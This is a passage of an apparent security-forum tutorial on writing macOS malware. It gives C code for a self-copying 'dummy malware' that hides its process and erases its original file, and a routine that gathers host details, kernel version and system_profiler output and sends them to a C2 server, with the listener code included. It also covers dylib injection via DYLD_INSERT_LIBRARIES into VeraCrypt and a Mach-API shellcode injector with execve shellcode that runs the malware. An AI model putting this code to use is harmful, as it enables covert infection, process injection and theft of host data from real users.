    if (chmod(dest_path, PERMISSIONS) == -1) {
        printf("Oops: Failed to set execute permission for %s\n", dest_path);
        exit(EXIT_FAILURE);
    }

    printf("Hey! copied from %s to %s\n", source_path, dest_path);
}
</code></pre>
<p>The function reads data from the source file in chunks and writes it to the destination file until the entire file is copied. After copying, it sets execute permission for the copied binary using <code>chmod()</code> to make it executable.</p>
<pre><code class="lang-c">// Main function
int main(int argc, char *argv[]) {
    // Determine home directory
    const char *home_dir;
    struct passwd *pw = getpwuid(getuid());
    if (pw == NULL) {
        printf("Oops: Failed to get home directory\n");
        exit(EXIT_FAILURE);
    }
    home_dir = pw-&gt;pw_dir;

    // Construct malware path
    char home_malware_path[PATH_MAX_LENGTH];
    snprintf(home_malware_path, sizeof(home_malware_path), "%s/Library/%s", home_dir, MALWARE_NAME);

    // Check if we have root privileges
    if (geteuid() == 0) {
        // Attempt to copy malware to system directory
        const char *system_malware_path = "/usr/bin/" MALWARE_NAME;
        if (access(system_malware_path, F_OK) != 0) {
            copy_file(argv[0], system_malware_path);
            execute_malware(system_malware_path);
        }
    } else {
        // Attempt to copy malware to user's home directory
        if (access(home_malware_path, F_OK) != 0) {
            copy_file(argv[0], home_malware_path);
            greet_user();
        }
    }

    // Hide the process
    hide_process();

    // Vanish, Damn
    remove(argv[0]);

    return EXIT_SUCCESS;
}
</code></pre>
<p>So the logic is as follows: It first checks if it has root privileges by calling geteuid(). If it does, it attempts to copy itself to /usr/bin/, and if successful, it executes the copied binary. If it doesn’t have root privileges, it attempts to copy itself to ~/Library/ (the user’s home directory). If successful, it prints “Hello, World!”. After copying itself it calls hide_process() to attempt to hide the process from detection. Finally, it removes the original binary file to erase traces of its presence.</p>
<p>This demonstrates a basic technique used by malware to hide itself on a system by copying itself to a system directory (/usr/bin/) or the user’s home directory (~/Library/) and then attempting to hide its process from detection.</p>
<p>This is far from being a malicious code, but it does provide us with valuable insights into working with the Mach API and conducting low-level system operations. Through this example, we’ve gained familiarity with essential concepts such as process management and communication.</p>
<pre data-code-wrap="asm"><code class="lang-plaintext">0x100003e79 &lt;+505&gt;: callq  0x100003c50               ; hide_process
0x100003e7e &lt;+510&gt;: movq   0x17b(%rip), %rax         ; (void *)0x0000000000000000
0x100003e85 &lt;+517&gt;: movl   (%rax), %edi
0x100003e87 &lt;+519&gt;: movl   -0x18(%rbp), %esi
0x100003e8a &lt;+522&gt;: callq  0x100003ec6               ; symbol stub for: mach_port_deallocate
0x100003e8f &lt;+527&gt;: xorl   %edi, %edi
0x100003e91 &lt;+529&gt;: movl   %eax, -0x21ec(%rbp)
0x100003e97 &lt;+535&gt;: callq  0x100003eb4               ; symbol stub for: exit
</code></pre>
<p>Here we put a our little program into a debugger, and as you can see specially in the disassembly part there’s instructions correspond to our operation like <code>/usr/bin/</code> also you can notice the cleanup operations are performed, such as deallocating  port and exiting the program.</p>
<h2><a name="the-naive-way-8" class="anchor" href="https://0x00sec.org#the-naive-way-8"></a>The Naive Way</h2>
<p>After infecting a new host, let’s ensure our malware notifies us of its presence by sending information about the host. Although this method might seem amateurish - a malware shouldn’t connect to a Command &amp; Control server (C2) initially - since we’re just exploring macOS as a new territory, it’s a starting point. We collect system information such as the system name, release version, machine architecture, hardware model, user ID, home directory, etc., and then send this information to the C2. For retrieving or modifying information about the system and environment, we can make use of <a href="https://developer.apple.com/documentation/kernel/1387446-sysctlbyname" rel="noopener nofollow ugc">Developer Apple - sysctlbyname</a>. This function enables us to retrieve specific system information, such as the cache line size, directly from the system kernel.</p>
<p>However, when it comes to System Owner/User Discovery, we typically access user-related data through standard POSIX interfaces like <code>getpwuid()</code>, relying on these interfaces as discussed before. To fetch the hardware model, we would replace <code>"hw.cachelinesize"</code> with <code>"hw.model"</code> in the <code>sysctlbyname</code> function call.</p>
<p>Next, we want to gather more information about the host, not just its hardware model. Now, you may wonder why we don’t just use the first example you introduced. Well, it’s simple. This is to showcase how we access user-related data through standard POSIX interfaces. However, if you want to introduce the hardware model in the above example, just</p>
<pre><code class="lang-c">count = sizeof(model); kr = sysctlbyname("hw.model", model, &amp;count, NULL, 0); EXIT_ON_MACH_ERROR("sysctl hw.model", 1);
</code></pre>
<p>we also wanna send some information like kernel version, for possible known vulnerabilities, to escalate, So here’s an example, we use the same function as to get hardware model</p>
<pre><code class="lang-c">size_t len = BUF_SIZE;
if (sysctlbyname("kern.version", &amp;kernel_version, &amp;len, NULL, 0) == 0) {
	send_data(sockfd, "\nKernel Version: ");
	send_data(sockfd, kernel_version);
</code></pre>
<p>Now let’s dump and send more information about the profile of the infected host, including details such as System Name,  Architecture, Login shell,  Home directory and any other relevant data that could aid in further exploiting or maintaining access to the compromised system, W’ll use function such as <code>uname</code>, <code>getpwuid</code>, and <code>getgrgid</code>,  Let’s take a look at the code,</p>
<pre><code class="lang-c">void system_info(int sockfd) {
  struct utsname sys_info;
  char kernel_version[BUF_SIZE];

  // Get system information
  if (uname( &amp; sys_info) != 0) {
    send_error("Failed to get system information");
    return;
  }

  send_data(sockfd, "\nSystem Name: ");
  send_data(sockfd, sys_info.sysname);
  send_data(sockfd, "\nRelease Version: ");
  send_data(sockfd, sys_info.release);
  send_data(sockfd, "\nMachine Architecture: ");
  send_data(sockfd, sys_info.machine);
  send_data(sockfd, "\nOperating System: ");
  send_data(sockfd, sys_info.sysname);
  send_data(sockfd, "\nVersion: ");
  send_data(sockfd, sys_info.version);
</code></pre>
<p>So, the function is pretty self-explanatory; it simply provides a snapshot of the system and user environment, which is crucial for gathering information on potential targets. However, since malware typically only has one chance for infection, it needs to be self-reliant before attempting to Phone Home. This is why the approach of using a dummy malware, primarily for testing and exploring options before developing an actual malware, is essential.</p>
<p>Nevertheless, deploying a dummy malware still provides attackers with a significant amount of information that could be leveraged for subsequent targeted attacks or exploiting vulnerabilities, whether in the kernel or user land. The malware could be multi-staged to ensure stealth and a low profile. This code can act as stage 1 of an attack, proliferating itself in the system, waiting to activate stage 2, and so on. These types of attacks are advanced and hard to detect, especially in environments like macOS, where malware can remain undetected for years.</p>
<p>Another type of information gathering employed by macOS malware, as seen in some reports, involves ‘LOLBins’ (Living off the Land Binaries). You can program the malware to simply execute <code>/usr/sbin/system_profiler -nospawn -detailLevel full</code>,  For example.</p>
<pre><code class="lang-c">void system_profiler(int sockfd) {
  FILE * fp;
  char buffer[BUF_SIZE];

  // Execute
  fp = popen("/usr/sbin/system_profiler -nospawn -detailLevel full", "r");
  if (fp == NULL) {
    send_error("Failed");
    return;
  }

  // Read command output and send over to C2 
  while (fgets(buffer, BUF_SIZE, fp) != NULL) {
    send_data(sockfd, buffer);
  }

  pclose(fp);
}
</code></pre>
<p>This command alone saves the trouble and provides all the information about a host that an attacker can gather. However, the catch is that such commands are visible and can be easily flagged. Despite this, it remains an easy and effective method for malware to extract details from the infected host.</p>
<p>Alright, so how do we transmit the data? We use <code>socket</code>. This API allows us to send data to the connected endpoint, which in this case is the Command &amp; Control server. Data is sent in the form of strings. To ensure that the data is properly formatted and transmitted over the socket to the C2 server, we rely on functions like <code>send()</code> for sending data, and file I/O functions such as <code>popen()</code> and <code>fgets()</code> for reliable reading and sending of data. It’s pretty simple.</p>
<p>The C2 server is also straightforward, designed solely for handling incoming connections. It won’t have any protection mechanisms to hide itself from the system where it’s running, but this server is basic for demonstration purposes only. I recommend implementing encryption, setting up a database to organize data, and generating a temporary ID to associate with each instance.</p>
<p>The extraction module (ext) starts an autonomous thread listening for incoming connections from malware instances. Once connected, the module simply prints the content of the incoming connection (which is the information extracted by the client) to the standard output.</p>
<pre><code class="lang-c">// The server will keep listening for incoming connections indefinitely
while (1) {
    // Accept a new connection from a client
    cltlen = sizeof(cltaddr);
    cltfd = accept(dexft_fd, (struct sockaddr *) &amp;cltaddr, &amp;cltlen);

    // Check if the accept call was successful
    if (cltfd &lt; 0) {
        // If accept failed, print an error message and continue listening
        printf("Failed to accept incoming connection, %d\n", cltfd);
        continue;
    }

    // Print out information about the connected client
    printf("Collecting data from client %s:%d...\n", inet_ntoa(cltaddr.sin_addr), ntohs(cltaddr.sin_port));

    // Receive data from the client and process it
    while ((br = recv(cltfd, buf, BUF_SIZE, 0)) &gt; 0) {
        // Write the received data to the standard output
        fwrite(buf, 1, br, stdout);
    }

    // Check if an error occurred during data reception
    if (br &lt; 0) {
        printf("ERROR: Failed to receive data from client!\n");
    }

    // Close the client socket
    close(cltfd);
}

return NULL;

</code></pre>
<p>As you can see, the code itself is quite simple yet functional. Once the client is executed, the server collects data from the connected clients, and then closes the connection before resuming listening for new connections,</p>
<pre><code class="lang-sh">Collecting data from client ...

System Name: Darwin
Release Version: 19.6.0
Machine Architecture: x86_64
Operating System: Darwin
</code></pre>
<p>Obviously, this will get flagged within seconds if there’s a security mechanism in place. Why, you may ask? Well, the behavior exhibited here screams malware—from establishing a connection to sending system information and continuously receiving and executing commands from a remote server. The network traffic pattern alone is a red flag. Plus, the transmission of system information immediately after connection establishment… But the good news is that most Mac users assume they’re safe by default, so they don’t entertain the idea that capable malware could go unnoticed.</p>
<p>So, if this were a targeted attack, something with a bit of obfuscation, perhaps polymorphic and advanced covert channels for communication in place, would get the job done. However, this explanation provides a simple overview of how dummy malware can be used as a learning piece of code before developing actual malware. Next, we’ll delve into a topic that I find quite interesting. Yes, you guessed it;</p>
<h1><a name="code-injection-9" class="anchor" href="https://0x00sec.org#code-injection-9"></a>Code Injection</h1>
<p>Actually, exploring Code Injection deserves its own article, and I’ll include some resources at the end. However, for now, let’s focus on two techniques that I find quite effective.  So, Let’s begin by introducing the first technique, which involves leveraging environment variables or DYLD_INSERT_LIBRARIES for code injection.</p>
<p>DYLD_INSERT_LIBRARIES is actually a powerful feature that allows users to preload dynamic libraries into applications, Both developers and attackers can inject code into running processes without modifying the original executable file is commonly used to intercept function calls, manipulate program behavior, or even introduce malicious functionality into legitimate application, As we gone see, It’s basically a colon separated list of dynamic libraries to load before the ones specified in the program. This lets you test new modules of existing dynamic shared libraries that are used in flat-namespace images by loading a temporary dynamic shared library with just the new modules.</p>
<p>In simple term’s, it will load any dylibs you specify in this variable before the program loads, essentially injecting a dylib into the application, So for example</p>
<pre><code class="lang-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
__attribute__((constructor))

void foo() {
  printf("Dynamic library injected! \n");
  system("/bin/bash -c 'echo Library injected!'");
}
</code></pre>
<p>As you can see we have a function <code>foo()</code> that prints to let us know that we successful injected a library and a system command that execute a shell to echo basically the same thing and that <code>attribute((constructor))</code> marks the function run before the application’s main function, into which we injected the <code>dylib</code>, piece of cake right, But how do we know identify binaries vulnerable to environment variable injection, on that later, but first let’s just try it on one of our previous program, So just compile that code like any other program and run it.</p>
<pre><code class="lang-sh">~ &gt; gcc -dynamiclib inject.c -o inject.dylib

~ &gt; DYLD_INSERT_LIBRARIES=inject.dylib ./foo
Dynamic library injected!
Library injected!
</code></pre>
<p>et voilà, When affected, what happens is that it loads any dylibs specified in this variable before the program loads, essentially injecting a dylib into the application. This could potentially lead to privilege escalation, right? Not so fast on the Apple platform binaries. As of macOS 10.14, third-party developers can opt in to a <a href="https://developer.apple.com/documentation/security/hardened_runtime_entitlements" rel="noopener nofollow ugc">hardened runtime</a> for their application, which can prevent the injection of dylibs using this technique.</p>
<p>So, basically, we can still perform injection when the application is not defined as having a “Hardened Runtime” and therefore allows the injection of dylibs using the environment variable. Alternatively, when the binary is using a hardened runtime and the developer released it with the appropriate entitlements, let’s go over this one more time:</p>
<ul>
<li>The “Disable-library-validation” entitlement allows any dylib to run on the binary even without checking who signed the file and the library. This permission usually exists in programs that allow community-written plugins.</li>
<li>The <code>com.apple.security.cs.allow-dyld-environment-variables</code> entitlement loosens the hardened runtime restrictions and allows the use of <code>DYLD_INSERT_LIBRARIES</code> to inject a library.</li>
</ul>
<p>Alright on possible target application, For example to run this on Safari.app It won’t work, because is hardened and lacks the matching entitlement,</p>
<p><img src="https://0xf00sec.github.io/images/IMG3.png" width="690" height="190"> </p>
<p>But that doesn’t necessarily imply that the application is not hardened, as there are other Hardened Runtime features that may not be reflected in the entitlements. So, to expedite the process, I found that Veracrypt is not using Hardened Runtime. Therefore, I’m going to use it as an example for the entire article. Sorry :), Now, let’s attempt to inject it, but first…</p>
<pre><code class="lang-c">__attribute__((constructor))

static void customConstructor(int argc, const char **argv)
{
printf("Foo!\n");
syslog(LOG_ERR, "Dylib injection successful in %s\n", argv[0]);
}
</code></pre>
<p>So, we simply print ‘foo’ and log a message using the <code>syslog()</code> function, which logs an error message indicating successful injection of a dynamic library (dylib) along with the name of the program. Let’s try it. If we see the following output, it seems that we’ve successfully loaded the library:</p>
<p><img src="https://0xf00sec.github.io/images/IMG4.png" width="690" height="285"> </p>
<p>If we attempt to use <code>DYLD_INSERT_LIBRARIES</code> in another binary that is hardened and lacks the matching entitlement, we won’t be able to load the library, and consequently, we won’t see the desired output.</p>
<p>However, some internal components of macOS expect threads to be created using the BSD APIs and have all Mach thread structures and <code>pthread</code> structures set up properly. This can present challenges, especially with changes introduced in macOS 10.14.</p>
<p>To address this issue, I came across a piece of code called <a href="https://newosxbook.com/src.jl?tree=listings&amp;file=inject.c" rel="noopener nofollow ugc">inject.c</a>. Additionally, I highly recommend reading the “Mac Hacker’s Handbook” as it provides invaluable insights and includes great examples of interprocess code injection.</p>
<p>From my understanding, the transition from Mach thread APIs to pthread APIs in macOS, particularly concerning the initialization of thread structures, presents challenges. However, the discovery of the <code>_pthread_create_from_mach_thread</code> function provides a viable alternative for initializing pthread structures from bare Mach threads. This ensures compatibility and proper functioning of threaded applications across different macOS versions.</p>
<p>For those interested, I’ve included examples demonstrating how to inject code to call <code>dlopen</code> and load a dylib into a remote mach task: <a href="https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a" rel="noopener nofollow ugc">Gist 1</a> &amp; <a href="https://gist.github.com/vocaeq/fbac63d5d36bc6e1d6d99df9c92f75dc" rel="noopener nofollow ugc">Gist 2</a>"</p>
<p>Alright, let’s discuss the second technique. It’s similar to methods used on Windows, and one common approach is process injection, which is the ability for one process to execute code in a different process. In Windows, this is often utilized to evade detection by antivirus software, for example, through a technique known as DLL hijacking. This allows malicious code to masquerade as part of a different executable. In macOS, this technique can have significantly more impact due to the differences in permissions between applications.</p>
<p>In the classic Unix security model, each process runs as a specific user. Each file has an owner, group, and flags that determine which users are allowed to read, write, or execute that file. Two processes running as the same user have the same permissions; it is assumed there is no security boundary between them. Users are considered security boundaries; processes are not. If two processes are running as the same user, then one process could attach to the other as a debugger, allowing it to read or write the memory and registers of that other process. The root user is an exception, as it has access to all files and processes. Thus, root can always access all data on the computer, whether on disk or in RAM.</p>
<p>This was essentially the same security model as macOS until the introduction of …  yep, SIP (System Integrity Protection)</p>
<h2><a name="os-x-shellcode-injection-10" class="anchor" href="https://0x00sec.org#os-x-shellcode-injection-10"></a>OS X Shellcode Injection</h2>
<p>Alright, so we’re going to write a simple shellcode injection program where the malware’s host process injects shellcode into the memory of a remote process. But before we proceed, let’s write a simple shellcode for testing purposes.</p>
<p>Writing 64-bit assembly on macOS differs somewhat from ELF. Here, you just need to understand the macOS executable file format, known as Mach-O. However, for simplicity, we’ll stick with the x86_64 architecture and we can later use a linker for Mach-O executables.</p>
<p>A simple “Hello World” program starts by declaring two sections: <code>.data</code> and <code>.text</code>. The <code>.data</code> section is used for storing initialized data, while the <code>.text</code> section contains executable code. Then we define the <code>_main</code> function as the entry point of the program, followed by a reference point in the code, which we’ll call <code>trick</code>. The <code>trick</code> section will be followed by a <code>call</code> instruction that invokes the <code>continue</code> subroutine and pops the address of the string ‘Hello World!’. Also, if you notice in the code, we have a system call at the end that exits our program. The first syscall is for writing data.</p>
<pre><code class="lang-c">section .data
section .text

global _main
	_main:

start:
	jmp trick

continue:
	pop rsi            ; Pop string address into rsi
	mov rax, 0x2000004 ; System call write = 4
	mov rdi, 1         ; Write to standard out = 1
	mov rdx, 14        ; The size to write
	syscall            ; Invoke the kernel
	mov rax, 0x2000001 ; System call number for exit = 1
	mov rdi, 0         ; Exit success = 0
	syscall            ; Invoke the kernel
	
trick:
	call continue
	db "Hello World!", 0, 0
</code></pre>
<p>Alright, it’s time to compile. I typically use NASM for assembling my code. Remember what I mentioned about using the linker to create Mach-O executables? Well, after assembling the code with NASM, we’ll need to link it using <code>ld</code>. This linker not only brings together the assembled code but also incorporates necessary system libraries.</p>
<pre><code class="lang-sh">~ &gt; ./nasm -f macho64 Hello.asm -o hello.o &amp;&amp; ld ./Hello.o -o Hello -lSystem -syslibroot `xcrun -sdk macosx --show-sdk-path`

~ &gt; ./Hello
Hello World!
</code></pre>
<p>Pretty sophisticated, right? Now, to actually turn it into machine code that we can use for injection, it needs to be converted into a hexadecimal representation. This representation consists of a small series of bytes that represent executable machine-language code. It essentially represents the exact sequence of instructions that the processor will execute. For this, we can utilize <code>objdump</code>.</p>
<pre><code class="lang-sh">~ &gt; objdump -d ./Hello | grep '[0-9a-f]:'| grep -v 'file'| cut -f2 -d:| cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '| sed 's/ $//g'| sed 's/ /\\x/g'| paste -d '' -s | sed 's/^/"/'| sed 's/$/"/g'

`\xeb\x1e\x5e\xb8\x04\x00\x00\x02\xbf\x01\x00\x00\x00\xba\x0e\x00\x00\x00\x0f\x05\xb8\x01\x00\x00\x02\xbf\x00\x00\x00\x00\x0f\x05\xe8\xdd\xff\xff\xff\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x72\x6c\x64\x21\x0d\x0a`
</code></pre>
<p>If, for some reason, you can’t extract the <code>shellcode</code> solely relying on <code>objdump</code>, you can always script kiddy a simple py, to parse the assembly output;</p>
<pre><code class="lang-python">def extract_shellcode(objdump_output):
    shellcode = ""
    length = 0
    lines = objdump_output.split('\n')
    
    for line in lines:
        if re.match("^[ ]*[0-9a-f]*:.*$", line):
            line = line.split(":")[1].lstrip()
            x = line.split("\t")
            opcode = re.findall("[0-9a-f][0-9a-f]", x[0])
            for i in opcode:
                shellcode += "\\x" + i
                length += 1

    return shellcode, length

def main():
    objdump_output = sys.stdin.read()
    shellcode, length = extract_shellcode(objdump_output)
    
    if shellcode == "":
        print("Bad")
    else:
        print("\n" + shellcode)

if __name__ == "__main__":
    main()
</code></pre>
<p>But does the <code>shellcode</code> work? To ensure its functionality, we should test whether we can perform a simple injection. One way to do this is by compiling the <code>shellcode</code> and storing it as a global variable within the executable’s <code>__TEXT,__text</code> section. We can achieve this by declaring the <code>shellcode</code> as a variable within the code itself. Here’s a simple example:</p>
<pre><code class="lang-c">const char output[] __attribute__((section("__TEXT,__text"))) =  "
\xeb\x1e\x5e\xb8\x04\x00\x00\x02\xbf\x01
\x00\x00\x00\xba\x0e\x00\x00\x00\x0f\x05
\xb8\x01\x00\x00\x02\xbf\x00\x00\x00\x00
\x0f\x05\xe8\xdd\xff\xff\xff\x48\x65\x6c
\x6c\x6f\x20\x57\x6f\x72\x6c\x64\x21\x0d\x0a";

typedef int (*funcPtr)();

int main(int argc, char **argv)
{
    funcPtr ret = (funcPtr) output;
    (*ret)();

    return 0;
}
</code></pre>
<p>Alright, now that we have the <code>shellcode</code>, let’s start writing the actual injector. The <code>main</code> function seems like the natural starting point. The logic is simple: we take a single command-line argument, which should be the process ID (PID) of the target process to inject the shellcode into. Then, we obtain a handle to our task using <code>task_for_pid()</code>. Next, we’ll allocate a memory buffer in the remote task with <code>mach_vm_allocate()</code>. After that, we’ll write our shellcode to the remote buffer with <code>mach_vm_write()</code>. We’ll modify the memory permissions of the remote buffer with <code>mach_vm_protect()</code>. Then, we’ll update the remote thread context to point to the start of the shellcode with <code>thread_create_running()</code>. Finally, we’ll run our shellcode, which will print “Hello World”.</p>
<p>Remember our earlier discussion about the differences between a Mach task thread and a BSD pthread, and the <code>task_for_pid()</code> API call. In order to develop a utility that utilizes <code>task_for_pid()</code>, you’ll need to create an <code>Info.plist</code> file. This file will be embedded into your executable and will enable code signing with the key set to “allow”. Below is an example of the Info.plist:</p>
<pre><code class="lang-c">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
&lt;plist version="1.0"&gt;
&lt;dict&gt;
&lt;key&gt;com.apple.security.get-task-allow&lt;/key&gt;
&lt;true/&gt;
&lt;/dict&gt;
&lt;/plist&gt;
</code></pre>
<p>Note:** not all sections of a program’s virtual memory permit their contents to be interpreted as code by the CPU (i.e., “marked executable”). Memory can be marked as readable (R), writable (W), executable (E), or some combination of the three. For instance, a page marked RW means one can read/write to these addresses in memory, but their contents may not be treated as executable by the CPU. This is a crucial aspect of memory protection and security in modern operating systems.</p>
<p>Executable memory regions are typically marked with the execute (E) permission, allowing the CPU to interpret the contents of these regions as machine instructions and execute them. This is essential for running programs, as the CPU needs to fetch instructions from memory and execute them.</p>
<p>However, allowing arbitrary memory regions to be executable can pose significant security risks, such as buffer overflow attacks or injection of malicious code. Therefore, modern operating systems employ memory protection mechanisms to restrict the execution of code to specific, authorized regions of memory.</p>
<p>By controlling the permissions of memory pages, operating systems can enforce security policies and prevent unauthorized execution of code. For example, writable memory regions that contain data should not be executable to prevent the execution of injected malicious code. Conversely, executable code should not be writable to prevent tampering with the program’s instructions.</p>
<p>Alright, the entry point we converts the PID provided as a string to an integer and calls the <code>inject_shellcode</code> function to inject the shellcode into the target process using the provided PID,</p>
<p>We need to interact with the target process, so we declare a few variables to hold essential information. These include <code>remote_task</code> to represent the task port of the target process, <code>remote_stack</code> to store the address of the allocated memory for the remote stack within the target process, and <code>shellcode_region</code> to keep track of the memory region allocated for the shellcode.</p>
<p>Now, the process begins. We need to get permission to access the target process, so we use the <code>task_for_pid</code> function to obtain the task port. This allows us to manipulate the memory and threads of the target process.</p>
<p>With access granted, we proceed to allocate memory within the target process. We reserve space for both the remote stack and the shellcode using <code>mach_vm_allocate</code>. This ensures that we have a place to execute our code, Once memory is allocated, we write our shellcode into the allocated memory space of the target process using <code>mach_vm_write</code>. This effectively places our code where it needs to be executed.</p>
<pre><code class="lang-c">int inject_shellcode(pid_t pid, unsigned char *shellcode, size_t shellcode_size) {
    task_t remote_task;
    mach_vm_address_t remote_stack = 0;
    vm_region_t shellcode_region;
    mach_error_t kr;

    // Get the task port for the target process
    kr = task_for_pid(mach_task_self(), pid, &amp;remote_task);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Failed to get the task port for the target process: %s\n", mach_error_string(kr));
        return -1;
    }

    // Allocate memory for the stack in the target process
    kr = mach_vm_allocate(remote_task, &amp;remote_stack, STACK_SIZE, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Failed to allocate memory for remote stack: %s\n", mach_error_string(kr));
        return -1;
    }

    // Allocate memory for the shellcode in the target process
    kr = mach_vm_allocate(remote_task, &amp;shellcode_region.addr, shellcode_size, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Failed to allocate memory for remote code: %s\n", mach_error_string(kr));
        return -1;
    }
    shellcode_region.size = shellcode_size;
    shellcode_region.prot = VM_PROT_READ | VM_PROT_EXECUTE;

    // Write the shellcode to the allocated memory in the target process
    kr = mach_vm_write(remote_task, shellcode_region.addr, (vm_offset_t)shellcode, shellcode_size);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Failed to write shellcode to remote process: %s\n", mach_error_string(kr));
        return -1;
    }

    // Adjust memory permissions for the shellcode
    kr = vm_protect(remote_task, shellcode_region.addr, shellcode_region.size, FALSE, shellcode_region.prot);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Failed to set memory permissions for remote code: %s\n", mach_error_string(kr));
        return -1;
    }

    // Create a remote thread to execute the shellcode
    x86_thread_state64_t thread_state;
    memset(&amp;thread_state, 0, sizeof(thread_state));
    thread_state.__rip = (uint64_t)shellcode_region.addr;
    thread_state.__rsp = (uint64_t)(remote_stack + STACK_SIZE);

    thread_act_t remote_thread;
    kr = thread_create(remote_task, &amp;remote_thread);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Failed to create remote thread: %s\n", mach_error_string(kr));
        return -1;
    }

    // Set the thread state
    kr = thread_set_state(remote_thread, x86_THREAD_STATE64, (thread_state_t)&amp;thread_state, x86_THREAD_STATE64_COUNT);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Failed to set thread state: %s\n", mach_error_string(kr));
        return -1;
    }

    // Resume the remote thread
    kr = thread_resume(remote_thread);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Failed to resume remote thread: %s\n", mach_error_string(kr));
        return -1;
    }

    printf("Shellcode injected successfully!\n");

    mach_port_deallocate(mach_task_self(), remote_thread);

    return 0;
}
</code></pre>
<p>To ensure that our shellcode can run, we modify the memory permissions of the allocated memory region containing the shellcode. We use <code>vm_protect</code> to set the appropriate permissions, allowing for execution. Now, it’s time to execute our shellcode. We create a remote thread within the target process using <code>thread_create</code>. This thread will be responsible for running our injected code.</p>
<p>Before we start the thread, we need to set its state. We prepare the thread to execute our shellcode by setting the instruction pointer (<code>rip</code>) to the starting address of the shellcode and the stack pointer (<code>rsp</code>) to the allocated remote stack. Finally, we’re ready to execute our shellcode. We resume the remote thread using <code>thread_resume</code>, allowing it to begin executing the injected code.</p>
<p>If everything goes smoothly, we print a success message indicating that the shellcode was injected successfully. We also clean up any resources used during the injection process by deallocating Mach ports. And that’s it! The entire process of injecting shellcode into a target process on macOS using Mach APIs.</p>
<p>In our injector, we’re injecting shellcode into a target process using Mach APIs in macOS. Now, one significant difference between POSIX threads and Mach threads comes into play here.<br>
POSIX threads utilize the thread local storage (TLS) data structure, which is crucial for managing thread-specific data. However, Mach threads don’t have this concept of TLS.</p>
<p>Now, when we inject our shellcode into the target process and create a remote thread to execute it, we can’t simply point the instruction pointer in the thread context struct and expect everything to work smoothly. Why? Because our shellcode, which is essentially unmanaged code, needs to run in a controlled environment, and transitioning from a Mach thread directly to executing our shellcode might cause issues.</p>
<p>So, to prevent potential crashes or errors, we need to ensure that our shellcode is executed within the context of a fully-fledged POSIX thread. This means that as part of our injection process, we have to somehow promote our shellcode from being executed within the context of a base Mach thread to being executed within the context of a POSIX thread. By doing this, we create a more stable environment for our shellcode to execute, ensuring that when the target process resumes its execution at the start of our shellcode, it does so without any issues. This promotion process is essential for the successful execution of our injected shellcode in user mode without causing crashes or unexpected behavior.</p>
<p>As you can see, we injected our <code>shellcode</code> into the <code>Veracrypt</code> process successfully. The message “Hello World!” was printed, confirming that the shellcode executed as expected and produced the desired output.</p>
<p><img src="https://0xf00sec.github.io/images/IMG5.png" width="690" height="273"> </p>
<p>However, let’s shift our focus now. Remember the code we previously developed to transmit system data to the C2 server? What if we inject shellcode into the Veracrypt process to execute our dummy malware, enabling it to establish communication with the C2 server and transmit host data?</p>
<p>To execute a shell command, considering I’m running zsh, we need to trigger a syscall to run <code>/bin/zsh -c</code>. For this, we need to utilize <code>execve</code>. What does this do? Simply put, it executes the program referenced by <code>_pathname</code>, which in our case will be the path to our dummy malware executable.</p>
<p>Alright, let’s proceed by writing a simple assembly code to execute <code>/bin/zsh -c '/Users/foo/dummy'</code>. First, we’ll set up a register (<code>rbx</code>) and load the string <code>'/bin/zsh'</code> into it. Once this string is pushed onto the stack, we’ll proceed to load the ASCII values for <code>-c</code> into the lower 16 bits of the <code>rax</code> register. After pushing this <code>-c</code> flag onto the stack, we’ll set the <code>rbx</code> register to point to the <code>-c</code> flag on the stack, as it will be necessary later during the syscall preparation.</p>
<p>Any additional details will be described in comments within the code. At the end of this section, there’s an indirect jump facilitating the execution of subsequent instructions. This jump redirects the program flow to the address stored in the <code>exec</code> subroutine, ensuring the continuity of execution.</p>
<pre><code class="lang-c">global _main

_main:
    xor rdx, rdx        ; Clear rdx register
    push rdx            ; Push NULL onto stack (String terminator)
    mov rbx, '/bin/zsh' ; Load '/bin/zsh' into rbx
    push rbx            ; Push '/bin/zsh' onto stack
    mov rdi, rsp        ; Set rdi to point to '/bin/zsh\0'
    xor rax, rax        ; Clear rax register
    mov ax, 0x632D      ; Load "-c" into lower 16 bits of rax
    push rax            ; Push "-c" onto stack
    mov rbx, rsp        ; Set rbx to point to "-c"
    push rdx            ; Push NULL onto stack
    jmp short dummy     ; Jump to label dummy

exec:
    push rbx            ; Push "-c" onto stack
    push rdi            ; Push '/bin/zsh' onto stack
    mov rsi, rsp        ; Set RSI to point to stack
    push 59             ; Push syscall number
    pop rax             ; Pop syscall number into rax
    bts rax, 25         ; Set 25th bit of rax (AT_FDCWD flag)
    syscall             ; Invoke syscall

dummy:
    call exec                   ; Call subroutine exec
    db '/Users/foo/dummy_m', 0  ; Define string
    push rdx                    ; Push NULL onto stack
</code></pre>
<p>Alright, it’s time to try this beauty. As usual, we’ll need to extract the shellcode and test it before using it. And just like that, bingo! We’ve successfully injected our shellcode, triggering our dummy malware. We’re now receiving host information in the C2 server. We can push this further by exploring additional capabilities and attack vectors, even achieve persistence, but I think that’s enough for now.</p>
<p><img src="https://0xf00sec.github.io/images/IMG6.png" width="690" height="353"> </p>
<p>Executing and sending host information essentially does nothing harmful to your computer. “Dummy” is more about demonstrating how malware can be triggered and how it uses injection techniques to spread. It’s also interesting for defensive evasion or adding backdoor capabilities. This was just a quick look at the Mach API, covering system calls and code injection techniques, and how an attacker can utilize something like process injection to achieve malicious behavior. In this example, we’ve used a legitimate process to inject and execute “malicious code,” potentially exposing host data to an attacker. This can be pushed further, but we’re here just to learn, and I encourage you to experiment with caution. Code injection must be used with care.</p>
